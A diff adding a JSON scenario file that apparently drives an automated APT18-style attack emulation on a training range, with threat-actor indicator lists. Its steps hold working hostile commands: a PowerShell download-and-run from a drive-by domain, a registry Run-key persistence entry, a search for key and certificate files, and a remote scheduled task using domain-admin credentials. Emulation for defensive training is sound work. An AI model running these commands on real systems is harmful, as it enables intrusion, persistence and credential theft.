@@ -1,0 +1,518 @@
+{
+    "meta_data": {
+        "name": "apt18",
+        "version": "v1.1.1",
+        "title": "APT18 Inspired Scenario 1",
+        "description": "An automated attack meant to emulate an APT actor with the common names TG-0416, Dynamite Panda, and Threat Group-0416. The attack leverages a variety of methods to perform operations on a victim.",
+        "author": "Attack Content",
+        "suggested_duration": 969
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "help_win_x86.exe",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "DataStaged",
+            "technique": "Collection",
+            "label": "dataStaged",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{Set-Clipboard -Value $(gc C:\\Windows\\System32\\drivers\\etc\\hosts); echo \"stderr: \\1 Command not found\"}"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "FileAndDirectoryDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "where /R C:\\Users *cert* *key* *pem* && echo \"stderr: \\1 Command not found\""
+                }
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "ingressToolTransfer",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Invoke-WebRequest -Uri \"",
+                            "self.driveby_domain2",
+                            "/",
+                            "self.tool_name2",
+                            "\" -OutFile C:\\Users\\$username\\AppData\\Local\\Temp\\",
+                            "self.tool_name2",
+                            "; start C:\\Users\\$username\\AppData\\Local\\Temp\\",
+                            "self.tool_name2",
+                            "; echo \"stderr: \u0001 Command not found\"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "RegistryRunKeysStartupFolder",
+            "technique": "Persistence",
+            "label": "addRunRegistryKey",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d C:\\Users\\$username\\AppData\\Local\\Temp\\",
+                            "self.tool_name2",
+                            " /f}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletion",
+            "technique": "DefenseEvasion",
+            "label": "fileDeletion",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c del C:\\Users\\Public\\pwn.txt && echo \"stderr: \u0001 Command not found\""
+                }
+            }
+        },
+        {
+            "tactic": "InternalDefacement",
+            "technique": "Impact",
+            "label": "internalDefacement",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{schtasks.exe /create /f /SC once /ST 23:59 /TN ",
+                            "self.taskname",
+                            " /TR ",
+                            "self.payload",
+                            " /RL highest /u ",
+                            "self.domain_admin_username",
+                            "@",
+                            "self.domain",
+                            " /p ",
+                            "self.domain_admin_password",
+                            " /ru ",
+                            "self.domain_admin_username",
+                            "@",
+                            "self.domain",
+                            " /rp ",
+                            "self.domain_admin_password",
+                            " /s ",
+                            "self.dst_hostname",
+                            "; echo \"stderr: \u0001 Command not found\"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "glb.it-desktop.com",
+            "it-desktop.com",
+            "wangke99.tgk.delldns.com",
+            "local.it-desktop.com",
+            "globalprint-us.com",
+            "hi.getgo2.com",
+            "intranetwabcam.com",
+            "ns1.logitech-usa.com",
+            "globalprint-gb.com",
+            "ns2.logitech-usa.com"
+        ],
+        "ip": [
+            "43.242.36.152/32",
+            "43.242.35.13/32",
+            "103.85.23.67/24",
+            "103.58.134.183/24",
+            "159.65.80.157/24",
+            "45.44.41.49/24",
+            "35.220.212.71/32",
+            "34.92.209.125/24",
+            "35.185.203.81/24",
+            "185.181.92.71/24",
+            "66.42.71.107/24",
+            "104.168.118.85/24"
+        ],
+        "binary": [
+            "at.exe",
+            "PSExec.exe",
+            "schtask.exe",
+            "vpnclient.exe",
+            "tools.exe",
+            "wdm.exe",
+            "proxy_plugin.exe",
+            "proxy_web_plugin.exe",
+            "lsm.exe",
+            "WarpPowerShell.exe"
+        ]
+    },
+    "spec": {
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "90",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "help_win_x86.exe"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "3.13.105.114/24",
+                "ioc-domain_driveby": "usdbgroup.com"
+            }
+        },
+        "targets": {
+            "1": {
+                "payload_destination": "C:\\Users\\Public"
+            },
+            "2": {
+                "ioc-taskname": {
+                    "template": [
+                        {
+                            "kind": "name",
+                            "id": "scenario_name"
+                        },
+                        "_",
+                        {
+                            "kind": "call",
+                            "func": {
+                                "kind": "name",
+                                "id": "time"
+                            },
+                            "args": []
+                        }
+                    ]
+                }
+            }
+        }
+    },
+    "preconditions": {
+        "state": {
+            "payload": "\"msg * HELLO FROM SIMSPACE\""
+        },
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_2": {
+                "path": [
+                    "targets",
+                    "2"
+                ]
+            },
+            "taskname": {
+                "path": [
+                    "targets",
+                    "2",
+                    "ioc-taskname"
+                ]
+            },
+            "domain": {
+                "path": [
+                    "targets",
+                    "2",
+                    "query-target_domain"
+                ]
+            },
+            "dst_hostname": {
+                "path": [
+                    "targets",
+                    "2",
+                    "query-target_hostname"
+                ]
+            },
+            "domain_admin_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_username"
+                ]
+            },
+            "domain_admin_password": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_password"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt2": {
+                "path": [
+                    "webProtocols_2",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
